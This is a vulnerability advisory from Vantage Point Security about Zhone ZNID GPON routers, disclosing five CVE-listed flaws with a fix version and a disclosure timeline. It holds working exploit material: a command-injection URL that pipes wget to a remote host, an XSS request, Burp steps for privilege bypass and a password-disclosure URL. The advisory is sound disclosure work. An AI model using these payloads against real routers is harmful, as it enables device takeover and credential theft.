@@ -1,0 +1,147 @@
+Vantage Point Security Advisory 2015-002
+========================================
+
+Title: Multiple Vulnerabilities found in ZHONE
+Vendor: Zhone
+Vendor URL: http://www.zhone.com
+Device Model: ZHONE ZNID GPON 2426A
+(24xx, 24xxA, 42xx, 42xxA, 26xx, and 28xx series models)
+Versions affected: < S3.0.501
+Severity: Low to medium
+Vendor notified: Yes
+Reported: 
+Public release: 
+Author: Lyon Yang <lyon[at]vantagepoint[dot]sg> <lyon.yang.s[at]gmail[dot]com>
+
+Summary:
+--------
+
+1. Insecure Direct Object Reference (CVE-2014-8356)
+---------------------------------------------------
+
+The administrative web application does not enforce authorization on the server side. User access is restricted via Javascript only, by display available functions for each particular user based on their privileges. Low privileged users of the Zhone Router can therefore gain unrestricted access to administrative functionality, e.g. by modifying the javascript responses returned by the Zhone web server. 
+
+Affected URL: http://<Router URL>/menuBcm.js
+
+To demonstrate the issue:
+
+1. Set your browser proxy to Burp Suite
+
+2. Add the following option to "Match and Replace". Match for the string 'admin' and replace with your low privilege user:
+
+3. Login to the Zhone Administrative via your browser with Burp Proxy and you will have full administrative access via the Zhone Web Administrative Portal.
+
+
+2. Admin Password Disclosure (CVE-2014-8357)
+--------------------------------------------
+
+Any low-privileged user of the ZHONE Router Web Administrative Portal can obtain all users passwords stored in the ZHONE web server. The ZHONE router uses Base64 encoding to store all users passwords for logging in to the Web Administrative portal. As these passwords are stored in the backup file, a malicious user can obtain all account passwords.
+
+Affected URL: http://<Router URL>/
+
+1. Browse to http://192.168.1.1/backupsettings.html:
+
+2. "View Source" and take note of the sessionKey:
+
+3. Browse to http://<Router
+URL>/backupsettings.conf?action=getConfig&sessionKey=<Enter Session
+Key Here>. and all user account passwords will be returned.
+
+
+3. Remote Code Injection (CVE-2014-9118)
+----------------------------------------
+
+Remote Command Injection in ZHONE Router Web Administrative Console
+
+Any user of the ZHONE Router can gain command injection on the router and can execute arbitrary commands on the host operating system via the vulnerable ZHONE router web administrative console.
+
+Affected URL:
+
+/zhnping.cmd?&test=traceroute&sessionKey=985703201&ipAddr=192.168.1.1|wget%20http://192.168.1.17/l00per_was_here&ttl=30&wait=3&queries=3
+
+Affected Parameter:
+
+ipAddr
+
+
+4. Stored Cross-Site Scripting
+---------------------------------------------------------------------------------------
+
+The zhnsystemconfig.cgi script is vulnerable to a stored cross-site scripting attack.
+
+Sample HTTP Request:
+
+GET /zhnsystemconfig.cgi?snmpSysName=ZNID24xxA- Route&snmpSysContact=Zhone%20Global%20Support&snmpSysLocation=www.zhone.com %3Cscript%3Ealert(1)%3C/script%3E&sessionKey=1853320716 HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.1/zhnsystemconfig.html
+Cookie: dm_install=no; dm_enable=no; hwaddr=54:A0:50:E4:F5:C0 
+Authorization: Basic (Base 64 Encoded:<USER:PASSWORD>)
+Connection: keep-alive
+
+Affected Parameters:
+1. snmpSysName
+2. snmpSysLocation 
+3. snmpSysContact
+
+
+5. Privilege Escalation via Direct Object Reference to Upload Settings Functionality
+---------------------------------------------------------------------------------------
+
+A low-privileged user can patch the router settings via the /uploadsettings.cgi page. With this functionality, the malicious attacker is able to patch the admin and support password, hence gaining full administrative access to the Zhone router.
+
+Sample POST Request:
+
+POST /uploadsettings.cgi HTTP/1.1
+Host: 192.168.1.1
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.1/updatesettings.html
+Cookie: dm_install=no; dm_enable=no; hwaddr=54:A0:50:E4:F5:C0
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=--------------------------- 75010019812050198961998600862
+Authorization: Basic (Base 64 Encoded:<USER:PASSWORD>)
+Content-Length: 88438
+
+-----------------------------75010019812050198961998600862
+Content-Disposition: form-data; name="filename"; filename="backupsettings.conf" Content-Type: config/conf
+<?xml version="1.0"?> <DslCpeConfig version="3.2">
+...
+<AdminPassword>dnFmMUJyM3oB</AdminPassword>
+...
+--- Configuration File Contents ---
+</DslCpeConfig>
+
+
+Fix Information:
+----------------
+
+Upgrade to version S3.1.241
+
+
+Timeline:
+---------
+
+2014/10: Issues No. (1 & 2) reported to Zhone
+2014/12: Issues No. (1 & 3) reported to Zhone
+2015/01: Requested Update
+2015/01: Fixes Provided by Zhone, but vulnerabilities still not fixed
+2015/02: Sent P.O.C Video to show how vulnerabilities work
+2015/03: Fixes Provided by Zhone, but vulnerabilities still not fixed
+2015/04: Requested Update
+2015/04: Issues No. (4 & 5) reported to Zhone
+2015/06: Requested Update
+2015/08: Requested Update
+2015/09: Fixes for issue 1, 4 and 5 completed by Zhone
+2015/10: Confirm that all issues has been fixed
+
+
+About Vantage Point Security:
+--------------------
+
+Vantage Point is the leading provider for penetration testing and security advisory services in Singapore. Clients in the Financial, Banking and Telecommunications industries select Vantage Point Security based on technical competency and a proven track record to deliver significant and measurable improvements in their security posture.
+
+https://www.vantagepoint.sg/
+office[at]vantagepoint[dot]sg
+
